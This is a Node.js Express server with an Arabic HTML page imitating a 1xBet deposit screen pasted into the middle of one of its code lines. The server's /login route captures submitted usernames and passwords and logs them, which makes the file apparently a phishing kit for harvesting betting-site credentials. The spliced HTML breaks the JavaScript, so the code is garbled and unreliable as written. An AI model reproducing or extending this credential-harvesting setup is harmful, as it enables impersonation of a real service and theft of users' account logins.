const express = require('express');
const path = require('path');
const app = express();

// إعدادات ضرورية لاستقبال البيانات من الصفحة
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(e<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إيداع - 1xBet</title>
    <style>
        body { font-family: sans-serif; background: #0e1e2d; color: white; margin: 0; padding: 15px; }
        .method-box { background: #1c2d3d; border-radius: 10px; padding: 15px; margin-bottom: 10px; display: flex; align-items: center; cursor: pointer; border: 1px solid transparent; }
        .method-box:hover { border-color: #2196F3; }
        .method-icon { width: 45px; height: 45px; background: white; border-radius: 8px; margin-left: 15px; display: flex; justify-content: center; align-items: center; color: #333; font-weight: bold; font-size: 10px; text-align: center; }
        .method-name { flex-grow: 1; font-size: 16px; font-weight: bold; }
        h2 { font-size: 18px; margin-bottom: 20px; border-right: 4px solid #2196F3; padding-right: 10px; }
    </style>
</head>
<body>

    <h2>طرق الإيداع الموصى بها</h2>

    <div class="method-box" onclick="location.href='https://1xbet.com'">
        <div class="method-icon" style="background: #e60000; color: white;">VODAFONE</div>
        <div class="method-name">فودافون كاش / Vodafone Cash</div>
        <span>➔</span>
    </div>

    <div class="method-box" onclick="location.href='https://1xbet.com'">
        <div class="method-icon" style="background: #6c2d91; color: white;">INSTA</div>
        <div class="method-name">انستا باي / InstaPay</div>
        <span>➔</span>
    </div>

    <div class="method-box" onclick="location.href='https://1xbet.com'">
        <div class="method-icon" style="background: #ff6600; color: white;">ORANGE</div>
        <div class="method-name">أورانج كاش / Orange Cash</div>
        <span>➔</span>
    </div>

    <div class="method-box" onclick="location.href='https://1xbet.com'">
        <div class="method-icon" style="background: #00a09a; color: white;">ETISALAT</div>
        <div class="method-name">اتصالات كاش / Etisalat Cash</div>
        <span>➔</span>
    </div>

</body>
</html>xpress.static('.'));

// عرض صفحة تسجيل الدخول الرئيسية
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// عرض صفحة الإيداع
app.get('/deposit', (req, res) => {
    res.sendFile(path.join(__dirname, 'deposit.html'));
});

// استقبال بيانات الدخول والتحويل لصفحة الإيداع
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    console.log(`بيانات دخول جديدة: ${username} | ${password}`);
    // نرسل رد بالنجاح لكي يقوم المتصفح بالتحويل
    res.json({ success: true });
});

app.listen(8080, '0.0.0.0', () => {
    console.log('السيرفر يعمل الآن على منفذ 8080');
});